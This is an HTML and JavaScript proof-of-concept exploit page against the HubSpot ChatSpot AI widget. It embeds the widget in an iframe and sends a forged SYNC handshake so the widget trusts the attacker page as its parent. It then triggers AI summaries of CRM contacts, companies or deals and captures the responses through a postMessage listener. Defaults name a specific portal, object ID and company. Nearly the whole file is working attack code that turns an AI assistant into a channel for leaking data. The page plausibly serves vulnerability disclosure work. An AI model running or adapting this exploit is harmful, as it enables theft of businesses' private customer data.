<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ChatSpot postMessage Origin Trust Bypass — PoC</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; margin: 0; }
  #log { height: 45vh; overflow-y: auto; padding: 10px; border-bottom: 2px solid #0f0; font-size: 12px; }
  #iframe-container { height: 55vh; position: relative; }
  iframe { width: 100%; height: 100%; border: none; }
  .status  { color: #0ff; }
  .trusted { color: #ff0; }
  .data    { color: #f80; white-space: pre-wrap; word-break: break-all; }
  .error   { color: #f00; }
  .write   { color: #f0f; }
  #controls { position: absolute; top: 10px; right: 10px; z-index: 9999; display: flex; flex-wrap: wrap; gap: 4px; max-width: 360px; justify-content: flex-end; }
  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; font-family: monospace; font-size: 11px; }
  button:hover { background: #0f0; color: #000; }
  #status-bar { padding: 4px 10px; background: #1a1a1a; font-size: 11px; border-bottom: 1px solid #333; }
  #config { padding: 8px 10px; background: #151515; border-bottom: 1px solid #333; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; font-size: 11px; }
  #config label { color: #aaa; }
  #config input, #config select { background: #222; color: #eee; border: 1px solid #444; padding: 2px 6px; font-family: monospace; font-size: 11px; }
  #config input { width: 140px; }
</style>
</head>
<body>

<div id="status-bar">
  ChatSpot postMessage SYNC Origin Hijack PoC | Portal: <span id="portal-display">146256700</span> | Status: <span id="status-text" class="status">IDLE</span>
</div>

<div id="config">
  <label>Portal ID: <input id="portalId" value="146256700"></label>
  <label>Object ID: <input id="objectId" value="739644991696"></label>
  <label>Object Type:
    <select id="objectTypeId">
      <option value="0-1">0-1 — Contact</option>
      <option value="0-2">0-2 — Company</option>
      <option value="0-3">0-3 — Deal</option>
    </select>
  </label>
  <label>Object Name: <input id="objectName" value="Figma Elastic"></label>
</div>

<div id="log">
  <div class="status">[INIT] PoC loaded. Configure above and click a READ button or use auto-launch.</div>
</div>

<div id="iframe-container">
  <div id="controls">
    <button onclick="testReadSummary()">READ: object_summary</button>
    <button onclick="testReadEngagements()">READ: engagements_summary</button>
    <button onclick="sendSetComponentState()">SEND: SET_COMPONENT_STATE</button>
    <button onclick="sendCopyLastResponse()">SEND: COPY_LAST_RESPONSE</button>
    <button onclick="sendSync()">RE-SEND SYNC</button>
    <button onclick="resetPoc()">RESET</button>
    <button onclick="clearLog()">CLR LOG</button>
    <button onclick="dumpAll()">DUMP ALL JSON</button>
  </div>
</div>

<script>
// ── State ──────────────────────────────────────────────────────────────────
const HS_IFR = '__hs-ifr';
let iframeEl      = null;
let chatspotId    = null;
let embedId       = null;
let originTrusted = false;
let msgCount      = 0;
let capturedResponses = [];

// ── Helpers ────────────────────────────────────────────────────────────────
function log(msg, cls = '') {
  const div = document.getElementById('log');
  const ts  = new Date().toISOString().split('T')[1].split('.')[0];
  const el  = document.createElement('div');
  if (cls) el.className = cls;
  el.textContent = `[${ts}] ${msg}`;
  div.appendChild(el);
  div.scrollTop = div.scrollHeight;
}

function setStatus(text) {
  document.getElementById('status-text').textContent = text;
}

function clearLog() {
  document.getElementById('log').innerHTML = '';
}

function getConfig() {
  const objectTypeId    = document.getElementById('objectTypeId').value;
  const objectTypeLabel = objectTypeId === '0-1' ? 'Contact' : objectTypeId === '0-2' ? 'Company' : 'Deal';
  return {
    portalId:       document.getElementById('portalId').value,
    objectId:       document.getElementById('objectId').value,
    objectTypeId,
    objectTypeLabel,
    objectName:     document.getElementById('objectName').value,
  };
}

function buildCopilotAction(intent, extra = {}) {
  return encodeURIComponent(JSON.stringify(Object.assign({ intent }, extra)));
}

// ── Core: load iframe ──────────────────────────────────────────────────────
function loadChatspot(copilotActionEncoded) {
  resetPoc(false);
  const cfg = getConfig();
  document.getElementById('portal-display').textContent = cfg.portalId;

  const src = `https://app-eu1.hubspot.com/chatspot-widget-ui/${cfg.portalId}/chat`
    + `?copilotAction=${copilotActionEncoded}`
    + `&hostAppName=attacker-page`
    + `&copilotThreadId=exfil-${Date.now()}`;

  log(`Building iframe: ${src}...`, 'status');
  setStatus('LOADING');

  iframeEl = document.createElement('iframe');
  iframeEl.id   = 'chatspot-iframe';
  iframeEl.src  = src;
  iframeEl.allow = 'microphone; camera';
  iframeEl.style.cssText = 'width:100%;height:100%;border:none;';
  document.getElementById('iframe-container').appendChild(iframeEl);

  // Send SYNC after load — use same 1 s delay that the working PoC uses
  iframeEl.addEventListener('load', () => {
    log('Iframe loaded. Sending SYNC in 1 s...', 'status');
    setStatus('IFRAME LOADED');
    setTimeout(sendSync, 1000);
  });
}

// ── SYNC handshake (from PoC #2 — the one that actually works) ─────────────
function sendSync() {
  if (!iframeEl || !iframeEl.contentWindow) {
    log('ERROR: iframe not ready', 'error');
    return;
  }
  embedId = crypto.randomUUID();
  const syncMsg = {
    id:      crypto.randomUUID(),
    format:  HS_IFR,
    from:    'HOST',
    to:      embedId,
    v:       1,
    payload: {
      type:          'SYNC',
      embedId,
      group:         'iframeable',
      name:          'embed',
      appData:       {},
      embeddedProps: {}
    }
  };
  log('→ Sending SYNC: ' + JSON.stringify(syncMsg), 'status');
  iframeEl.contentWindow.postMessage(syncMsg, '*');
}

// ── Generic __hs-ifr message sender ───────────────────────────────────────
function sendHsIfrMessage(payloadType, extra = {}) {
  if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
  if (!originTrusted) { log('Origin not yet trusted — waiting for SYNC_ACK first', 'error'); return; }
  const msg = {
    id:     crypto.randomUUID(),
    format: HS_IFR,
    from:   'HOST',
    to:     chatspotId || '*',
    v:      1,
    payload: Object.assign({ type: payloadType }, extra)
  };
  log('→ Sending ' + payloadType + ': ' + JSON.stringify(extra), 'write');
  iframeEl.contentWindow.postMessage(msg, '*');
}

// ── Button actions ─────────────────────────────────────────────────────────
function testReadSummary() {
  const cfg = getConfig();
  const action = buildCopilotAction('object_summary', {
    objectId:       cfg.objectId,
    objectTypeId:   cfg.objectTypeId,
    objectTypeLabel: cfg.objectTypeLabel,
    objectName:     cfg.objectName,
    label:          cfg.objectTypeLabel,
    summaryType:    'STANDARD'
  });
  log('--- Reloading with intent: object_summary ---', 'status');
  loadChatspot(action);
}

function testReadEngagements() {
  const cfg = getConfig();
  const action = buildCopilotAction('object_engagements_summary', {
    objectId:   cfg.objectId,
    objectType: cfg.objectTypeLabel.toUpperCase()
  });
  log('--- Reloading with intent: object_engagements_summary ---', 'status');
  loadChatspot(action);
}

function sendSetComponentState() {
  sendHsIfrMessage('SET_COMPONENT_STATE', {
    updates: {
      isOpen:           true,
      isReady:          true,
      isLoaded:         true,
      isDisabled:       false,
      isFullscreenMode: false
    },
    target: 'nav-components:chatspot-sidebar'
  });
}

function sendCopyLastResponse() {
  sendHsIfrMessage('INVOKE_CAPABILITY', {
    name:   'COPY_LAST_RESPONSE',
    source: 'attacker',
    args:   {}
  });
}

function resetPoc(doLog = true) {
  if (iframeEl) iframeEl.remove();
  iframeEl      = null;
  chatspotId    = null;
  embedId       = null;
  originTrusted = false;
  msgCount      = 0;
  setStatus('IDLE');
  if (doLog) log('--- RESET ---', 'status');
}

// ── Dump all captured responses to a new window ──────────────────────────
function dumpAll() {
  const win = window.open('', '_blank');
  win.document.write('<pre style="background:#111;color:#0f0;padding:20px;font-size:12px;">'
    + JSON.stringify(capturedResponses, null, 2)
      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    + '</pre>');
}

// ── Main message listener ──────────────────────────────────────────────────
window.addEventListener('message', e => {
  if (!e.data) return;

  // Only handle __hs-ifr protocol
  if (e.data.format !== HS_IFR) {
    const raw = JSON.stringify(e.data);
    if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
      log(`← NON-IFR msg from ${e.origin}: ${raw}`, 'data');
    }
    return;
  }

  msgCount++;
  const payload = e.data.payload || {};
  const msgType = payload.type || e.data.type || '(unknown)';

  log(`← [#${msgCount}] ${msgType} from ${e.origin}`, 'status');

  // Capture chatspotId from any incoming message
  const senderId = e.data.from;
  if (senderId && !chatspotId) {
    chatspotId = senderId;
    log(`  chatspotId captured: ${chatspotId}`, 'status');
  }

  // ── SYNC_ACK: trust established ──
  if (msgType === 'SYNC_ACK' || msgType === 'SYNC-ACK') {
    chatspotId    = e.data.from || chatspotId;
    originTrusted = true;
    setStatus('SYNC HIJACKED ✓');
    log('*** ORIGIN TRUST ESTABLISHED — attacker is now trusted parent ***', 'trusted');
    log(`  Widget believes its parent is: ${window.location.origin}`, 'trusted');
    log(`  chatspotId: ${chatspotId}`, 'trusted');
  }

  // ── READY: widget is up, push component state ──
  if (msgType === 'READY') {
    log('Widget READY — sending SET_COMPONENT_STATE...', 'trusted');
    sendSetComponentState();
    // Probe for component state after AI has had time to respond
    setTimeout(() => {
      log('→ Probing GET_COMPONENT_STATE...', 'write');
      sendHsIfrMessage('GET_COMPONENT_STATE', {
        target: 'nav-components:chatspot-sidebar'
      });
    }, 6000);
  }

  // ── COMPONENT_STATE_CHANGED: may contain AI response text ──
  if (msgType === 'COMPONENT_STATE_CHANGED') {
    log('*** COMPONENT_STATE_CHANGED — possible AI response data ***', 'trusted');
    log('  FULL STATE: ' + JSON.stringify(payload, null, 2), 'data');
    capturedResponses.push({ ts: Date.now(), origin: e.origin, type: 'STATE_CHANGED', data: payload });
  }

  // ── GET_COMPONENT_STATE response ──
  if (msgType === 'COMPONENT_STATE') {
    log('*** COMPONENT_STATE response received ***', 'trusted');
    log('  FULL STATE: ' + JSON.stringify(payload, null, 2), 'data');
    capturedResponses.push({ ts: Date.now(), origin: e.origin, type: 'COMPONENT_STATE', data: payload });
  }

  // ── INVOKE_CAPABILITY: track capability calls ──
  if (msgType === 'INVOKE_CAPABILITY') {
    log(`  CAP triggered: ${payload.name}`, 'trusted');
    log(`  CAP args: ${JSON.stringify(payload.args)}`, 'data');

    // Confirm AI pipeline fired
    if (payload.name === 'UPDATE_QUERY_PARAM_CAP'
        && payload.args?.key === 'copilotAction'
        && payload.args?.value === '') {
      log('  AI FIRED — AI pipeline triggered, CRM data being read', 'trusted');
      // Schedule COPY_LAST_RESPONSE 8s after AI fires to give it time to finish
      setTimeout(() => {
        log('→ Auto-sending COPY_LAST_RESPONSE (8s after AI fired)...', 'write');
        sendHsIfrMessage('INVOKE_CAPABILITY', {
          name:   'COPY_LAST_RESPONSE',
          source: 'attacker',
          args:   {}
        });
      }, 8000);
    }

    // Log UPDATE_QUERY_PARAM_CAP args fully — may contain encoded CRM data
    if (payload.name === 'UPDATE_QUERY_PARAM_CAP') {
      log(`  PARAM key=${payload.args?.key} value=${payload.args?.value}`, 'data');
    }
  }

  // Log ALL payloads in full — no truncation
  const raw = JSON.stringify(e.data, null, 2);
  capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
  log(`  FULL PAYLOAD (${raw.length} bytes):\n${raw}`, 'data');
});

// Auto-launch on load
document.addEventListener('DOMContentLoaded', () => {
  const cfg = getConfig();
  log(`Target portal:  ${cfg.portalId}`, 'status');
  log(`Target object:  ${cfg.objectId} (${cfg.objectTypeLabel})`, 'status');
  log('Attack: first-message-wins SYNC origin trust bypass', 'status');
  log('Click READ: object_summary or READ: engagements_summary to start.', 'status');
});
</script>
</body>
</html>
